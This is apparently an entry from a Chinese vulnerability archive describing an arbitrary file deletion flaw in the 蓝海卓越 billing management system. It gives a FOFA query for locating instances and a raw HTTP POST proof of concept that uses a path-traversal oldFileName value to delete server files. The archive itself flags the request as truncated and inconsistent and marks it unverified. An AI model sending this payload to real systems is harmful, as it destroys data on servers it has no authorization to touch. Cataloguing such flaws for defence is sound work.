---
source: "wy876 漏洞文库"
title: "蓝海卓越计费管理系统 picUpFile oldFileName路径遍历删除"
product: "蓝海卓越计费管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，有效后台会话疑似"
prerequisites: "请求带PHP会话"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mcsdegx6gomcebd8"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FpicUpLoad%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E.md"
fofa: "title==\"蓝海卓越计费管理系统\""
id: "vw-b84002017943fedbd7978a84"
entity_id: "ve-b84002017943fedbd7978a84"
schema_version: "1"
previous_fofa_unverified: "title=="
---

# 蓝海卓越计费管理系统 picUpFile oldFileName路径遍历删除

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：蓝海卓越计费管理系统；picUpFile oldFileName路径遍历删除
- 版本、配置及部署条件：版本未知，有效后台会话疑似
- 认证与权限前提：请求带PHP会话
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 删除示例会真实删除文件，高风险非只读检测，应显著标记和仅使用可恢复测试文件
- Content-Length1447494与只剩PNG片段严重不符、multipart缺闭合边界，删除前后证据空白
- 标题picUpLoad与实际picUpFile.php不符；上传jpg但字节为PNG，数据已截断
- 无版本/修复或成功响应

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
蓝海卓越 计费管理系统picUpLoad存在任意文件删除漏洞

## 二、影响版本
+ 蓝海卓越 计费管理系统

## 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征


## 四、漏洞复现
```http
POST /inc/picUpFile.php?upFileFoler=&upFileID=&viewID= HTTP/1.1
Host: 
Content-Length: 1447494
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryehA9evlvumScbjSw
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=lp91fvnja6f987dj7jmkjh5601
Connection: close

------WebKitFormBoundaryehA9evlvumScbjSw
Content-Disposition: form-data; name="oldFileName"

../../../../../usr/local/usr-gui/test.php
------WebKitFormBoundaryehA9evlvumScbjSw
Content-Disposition: form-data; name="file"; filename="c.jpg"
Content-Type: image/jpeg

PNG


```

> 请求长度说明：原资料 Content-Length 为 1447494；保留原始标头；其数值未据实际请求体重新计算或验证。

删除前


删除后


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mcsdegx6gomcebd8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
